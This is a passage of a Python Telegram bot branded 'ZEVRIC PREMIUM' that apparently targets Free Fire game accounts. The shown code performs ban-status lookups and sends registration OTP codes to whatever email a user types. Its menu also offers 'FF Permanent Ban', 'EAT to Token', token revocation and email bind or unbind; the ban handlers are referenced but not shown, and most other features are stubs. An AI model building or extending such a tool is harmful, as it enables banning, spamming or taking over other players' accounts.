                    print(f"[BANCHECK] Status: {resp.status_code}")
                    
                    if resp.status_code == 200:
                        return resp, 200
                except Exception as e:
                    print(f"[BANCHECK] Error: {e}")
                    continue
            
            return None, 0
        
        response, status = await asyncio.to_thread(fetch_ban)
        
        try:
            await msg.delete()
        except:
            pass
        
        if response and status == 200:
            try:
                data = response.json()
                account_id = data.get('account_id', uid)
                nickname = data.get('nickname', 'N/A')
                region = data.get('region', 'IND')
                level = data.get('level', 'N/A')
                ban_info = data.get('ban_info', {})
                
                if ban_info and ban_info.get('is_banned'):
                    ban_start = ban_info.get('ban_start_time', 'N/A')
                    txt = f"""💀 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 💀

🆔 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗗: {account_id}
👤 𝗡𝗜𝗖𝗞𝗡𝗔𝗠𝗘: {nickname}
🌍 𝗥𝗘𝗚𝗜𝗢𝗡: {region}
📊 𝗟𝗩𝗟: {level}

⚠️ 𝗦𝗧𝗔𝗧𝗨𝘀: 
💀 𝗣𝗘𝗥𝗠𝗔𝗡𝗘𝗡𝗧𝗟𝗬 𝗕𝗔𝗡𝗡𝗘𝗗 💀

🕐 𝗕𝗔𝗡 𝗗𝗔𝗧𝗘: {ban_start}

👑 @just_zevric"""
                else:
                    txt = f"""💀 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 💀

🆔 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗗: {account_id}
👤 𝗡𝗜𝗖𝗞𝗡𝗔𝗠𝗘: {nickname}
🌍 𝗥𝗘𝗚𝗜𝗢𝗡: {region}
📊 𝗟𝗘𝗩𝗘𝗟: {level}

✅ 𝗦𝗧𝗔𝗧𝗨𝘀: 𝗡𝗢𝗧 𝗕𝗔𝗧𝗧𝗘𝗗 ✅
𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗰𝗹𝗶𝗻

👑 @just_zevric"""
                
                await update.message.reply_text(txt, reply_markup=get_main_keyboard())
            except Exception as e:
                print(f"[BANCHECK] Parse error: {e}")
                await update.message.reply_text(f"❌ Parse Error!\nUID: {uid}\n@just_zevric", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text(f"⚠️ API Down or UID Not Found\nUID: {uid}\n\nTry Again Later\n👑 @just_zevric", reply_markup=get_main_keyboard())
    
    except Exception as e:
        print(f"[BANCHECK ERROR] {e}")
        try:
            await msg.delete()
        except:
            pass
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿! {str(e)[:150]}\n@just_zevric", reply_markup=get_main_keyboard())
    
    return ConversationHandler.END

# ========== RESUB OTP (FIXED) ==========
async def resub_otp_start(update, context):
    await update.message.reply_text(
        "📧 𝗥𝗘𝗦𝗨𝗕𝗣𝗦𝗖𝗥𝗜𝗕𝗘 𝗢𝗧𝗣 📧\n\n"
        "✉️ 𝗘𝗻𝘁𝗲𝗿 𝗘𝗺𝗮𝗶𝗟 💎\n\n"
        "📌 𝗘𝘅𝗮𝗠𝗽𝗹𝗲: example@gmail.com",
        reply_markup=get_main_keyboard()
    )
    return RESUB_EMAIL

async def resub_otp_email(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    email = update.message.text.strip()
    
    if "@" not in email or "." not in email:
        await update.message.reply_text("❌ Invalid Email Format!\nExample: example@gmail.com", reply_markup=get_main_keyboard())
        return RESUB_EMAIL
    
    msg = await update.message.reply_text(f"📧 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗢𝗧𝗣... ⏳💎")
    
    try:
        def send_otp():
            return send_register_code_email(email)
        
        status, response = await asyncio.to_thread(send_otp)
        
        try:
            await msg.delete()
        except:
            pass
        
        if status == 200:
            await update.message.reply_text(
                f"✅ 𝗢𝗧𝗣 𝗕𝗘𝗛𝗘𝗝𝗜 ✅\n\n📧 {email}\n\n✉️ Check Your Email!\n\n💡 Not in inbox?\n   - Check Spam Folder\n   - Try Again After 5 mins\n\n👑 @just_zevric",
                reply_markup=get_main_keyboard()
            )
        else:
            await update.message.reply_text(
                f"⚠️ 𝗗𝗜𝗡 𝗣𝗔𝗦𝗔𝗞𝗢 ⚠️\n\n📧 {email}\n\n💡 Try After 10 mins\nor Use Different Email\n\n👑 @just_zevric",
                reply_markup=get_main_keyboard()
            )
    
    except Exception as e:
        print(f"[RESUB ERROR] {e}")
        try:
            await msg.delete()
        except:
            pass
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗿𝗿! {str(e)[:100]}\n@just_zevric", reply_markup=get_main_keyboard())
    
    return ConversationHandler.END

# ========== SWITCH MENU ==========
async def switch_menu(update, context):
    text = update.message.text.strip()
    
    if text == "🔍 Bind Info Check":
        return await check_info_start(update, context)
    elif text == "📧 Bind Email":
        return await bind_email_start(update, context)
    elif text == "🔄 Change Bind Email":
        return await change_email_start(update, context)
    elif text == "❌ Unbind Email":
        return await unbind_email_start(update, context)
    elif text == "⏱️ Cancel Request":
        return await cancel_bind_start(update, context)
    elif text == "🔑 EAT to Token":
        return await eat_to_token_start(update, context)
    elif text == "🚪 Revoke Token":
        return await revoke_token_start(update, context)
    elif text == "💀 FF Permanent Ban":
        return await ff_ban_start(update, context)
    elif text == "📧 Resubscribe OTP":
        return await resub_otp_start(update, context)
    elif text == "💀 Check Ban":
        return await ban_check_start(update, context)
    elif text == "👑 Owner Info":
        return await owner_info(update, context)
    elif text == "🌐 EAT Website":
        return await eat_website_info(update, context)
    elif text == "🔍 Check Platform":
        return await check_platform_start(update, context)
    else:
        await update.message.reply_text("❌ Invalid Option!", reply_markup=get_main_keyboard())
        return ConversationHandler.END

# ========== ADD MORE FUNCTION STUBS ==========
async def start(update, context):
    await update.message.reply_text("🔥 𝗭𝗘𝗩𝗥𝗜𝗖 PREMIUM 💎\n\n@just_zevric", reply_markup=get_main_keyboard())

async def check_info_start(update, context):
    await update.message.reply_text("Coming Soon ⏳", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def bind_email_start(update, context):
    await update.message.reply_text("Coming Soon ⏳", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def change_email_start(update, context):
    await update.message.reply_text("Coming Soon ⏳", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def unbind_email_start(update, context):
    await update.message.reply_text("Coming Soon ⏳", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def cancel_bind_start(update, context):
    await update.message.reply_text("Coming Soon ⏳", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def eat_to_token_start(update, context):
    await update.message.reply_text("Coming Soon ⏳", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def revoke_token_start(update, context):
    await update.message.reply_text("Coming Soon ⏳", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def owner_info(update, context):
    msg = """👑 𝗭𝗘𝗩𝗥𝗜𝗖 — 𝗢𝗪𝗡𝗘𝗥 𝗜𝗡𝗙𝗢 👑💎

👤 𝗡𝗮𝗺𝗲 : 𝗭𝗲𝘃𝗿𝗶𝗰 ✨💎
📱 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 : @just_zevric 🚀✨

💖 𝗕𝘆 @just_zevric 😘💖"""
    await update.message.reply_text(msg, reply_markup=get_main_keyboard())

async def eat_website_info(update, context):
    await update.message.reply_text("Coming Soon ⏳", reply_markup=get_main_keyboard())

async def check_platform_start(update, context):
    await update.message.reply_text("Coming Soon ⏳", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def handle_message(update, context):
    return await switch_menu(update, context)

async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            MessageHandler(filters.Regex(ALL_MENU), handle_message),
        ],
        states={
            FF_BAN_TOKEN: [MessageHandler(filters.TEXT, ff_ban_token)],
            FF_BAN_CONFIRM: [MessageHandler(filters.TEXT, ff_ban_confirm)],
            BAN_CHECK_UID: [MessageHandler(filters.TEXT, ban_check_uid)],
            RESUB_EMAIL: [MessageHandler(filters.TEXT, resub_otp_email)],
        },
        fallbacks=[CommandHandler("start", start)],
    )
    
    app.add_handler(conv_handler)
    
    await app.run_polling()

if __name__ == '__main__':
    import sys
    asyncio.run(main())
